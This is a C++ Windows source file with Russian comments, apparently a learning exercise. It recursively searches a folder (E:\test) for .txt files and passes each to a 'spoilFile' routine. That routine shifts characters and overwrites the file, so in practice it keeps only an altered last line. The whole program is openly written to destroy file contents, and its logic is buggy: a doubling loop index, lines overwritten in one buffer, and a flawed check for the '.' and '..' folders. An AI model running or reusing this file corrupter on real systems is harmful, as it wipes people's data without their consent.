#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <iostream>
#include <fstream> 
#include <string> 
using namespace std;

void spoilFile(char *myFile) {
	string line;
	ifstream myfile(myFile);  //открыли файл для чтения 
	if (myfile.is_open())  //если открыт 
	{
		while (!myfile.eof())  //проход с начала до конца 
		{
			getline(myfile, line);  //поолучение строки 
			for (size_t i = 1; i < line.length(); i += i)
			{
				line[i] = (int)(line[i]) - 10;  //заменили символы в строке 
			}
		}
		myfile.close();  //закрыли файл 
	}
	else
		cout << "Cant open file" << endl;

	ofstream out;  // поток для записи 
	out.open(myFile);  // окрываем файл для записи 
	if (out.is_open())  //если открыт 
	{
		out << line << endl;  //то запишем новую строку в файл 
	}
}

int seek(LPCTSTR lpszFileName, BOOL InFolders)
{
	LPTSTR part;
	HANDLE hSearch = NULL;
	char temp[MAX_PATH];  //временный массив
	char name[MAX_PATH];

	// структура для описания файлов, 
	//найденных функциями FindFirstFile, FindNextFile и 
	WIN32_FIND_DATA wfd; 
	memset(&wfd, 0, sizeof(WIN32_FIND_DATA));

	//поиск во внутренних папках
	if (InFolders)
	{
		//Функция GetFullPathName извлекает полный путь и имя указанного файла.
		//Если функция завершается успешно, то записывает путь в temp

		if (GetFullPathName(lpszFileName, MAX_PATH, temp, &part) == 0)
			//0 - значит ф-ия завершилась с ошибкой
			return 0;
		lstrcpy(name, part);
		lstrcpy(part, "*.*");

		//Если папка существует, то мы заходим в нее
		wfd.dwFileAttributes = FILE_ATTRIBUTE_DIRECTORY;

		//Ищет каталог файла или подкаталог, название которого
		//соответствует указанному имени файла(temp)
		if (!((hSearch = FindFirstFile(temp, &wfd)) == INVALID_HANDLE_VALUE))
			do
			{
				//Если текущая папка является служебной папкой, которую не нужно проверять
				//Пропуск папок ".." , "." 
				if (!strncmp(wfd.cFileName, ".", 1) || !strncmp(wfd.cFileName, "..", 2))
					continue;
				//Если это папка
				if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
				{
					//Создаем новый путь
					char next[MAX_PATH];

					//Получаем полный путь и имя файла для следующего файла.
					if (GetFullPathName(lpszFileName, MAX_PATH, next, &part) == 0)
						return 0;
					lstrcpy(part, wfd.cFileName);
					lstrcat(next, "\\");
					lstrcat(next, name);

					//Рекурсивно двигаемся дальше
					seek(next, TRUE);
				}
			} while (FindNextFile(hSearch, &wfd)); //Пока в папке еще есть файлы
			FindClose(hSearch); //Закрываем дескриптор поиска
	}

	//Если поиск завершен
	if ((hSearch = FindFirstFile(lpszFileName, &wfd)) == INVALID_HANDLE_VALUE)
		return 1;
	do
		if (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) // is it's a file
		{
			char file[MAX_PATH];
			if (GetFullPathName(lpszFileName, MAX_PATH, file, &part) == 0) return 0;
			lstrcpy(part, wfd.cFileName);

			//Отправляем полный путь файла для порчи
			spoilFile(file);
		}
	while (FindNextFile(hSearch, &wfd));  //Следующий файл в папке
	FindClose(hSearch);  //Закрыть дескриптор поиска

	return 1;
}

int main() {
	if (!seek("E:\\test\\*.txt", true))
		cout << "Searching failed" << endl;
	return 0;
}